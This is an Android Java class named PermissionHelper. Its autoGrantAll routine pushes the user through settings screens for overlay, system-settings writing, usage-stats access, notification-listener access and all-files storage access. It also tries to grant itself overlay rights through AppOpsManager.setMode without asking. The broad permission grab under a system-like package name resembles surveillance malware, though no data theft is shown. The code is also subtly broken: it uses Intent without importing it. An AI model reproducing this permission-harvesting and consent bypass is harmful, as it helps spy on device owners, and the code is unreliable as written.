package com.xrc.system.features;

import android.app.AppOpsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.Constants;

public class PermissionHelper {
    private static final String TAG = Constants.TAG + ":Perm";
    private static PermissionHelper instance;
    private final Context ctx;

    private PermissionHelper(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized PermissionHelper get(Context ctx) {
        if (instance == null) {
            instance = new PermissionHelper(ctx);
        }
        return instance;
    }

    public void autoGrantAll() {
        grantOverlay();
        grantWriteSettings();
        grantAppOps();
        grantUsageStats();
        grantNotificationListener();
        grantManageStorage();
    }

    private void grantOverlay() {
        if (!Settings.canDrawOverlays(ctx)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
            intent.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        }
    }

    private void grantWriteSettings() {
        if (!Settings.System.canWrite(ctx)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
            intent.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        }
    }

    private void grantAppOps() {
        try {
            AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
            if (aom == null) return;
            int mode = aom.checkOpNoThrow(AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    Process.myUid(), ctx.getPackageName());
            if (mode != AppOpsManager.MODE_ALLOWED) {
                aom.setMode(AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                        Process.myUid(), ctx.getPackageName(), AppOpsManager.MODE_ALLOWED);
            }
        } catch (Exception e) {
            Log.e(TAG, "AppOps grant failed", e);
        }
    }

    private void grantUsageStats() {
        try {
            AppOpsManager aom = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
            if (aom == null) return;
            int mode = aom.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), ctx.getPackageName());
            if (mode != AppOpsManager.MODE_ALLOWED) {
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Usage stats grant failed", e);
        }
    }

    private void grantNotificationListener() {
        try {
            String enabled = Settings.Secure.getString(ctx.getContentResolver(), "enabled_notification_listeners");
            String pkg = ctx.getPackageName();
            if (enabled == null || !enabled.contains(pkg)) {
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Notification listener grant failed", e);
        }
    }

    private void grantManageStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        }
    }

    public boolean hasPermission(String perm) {
        return ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
    }
}
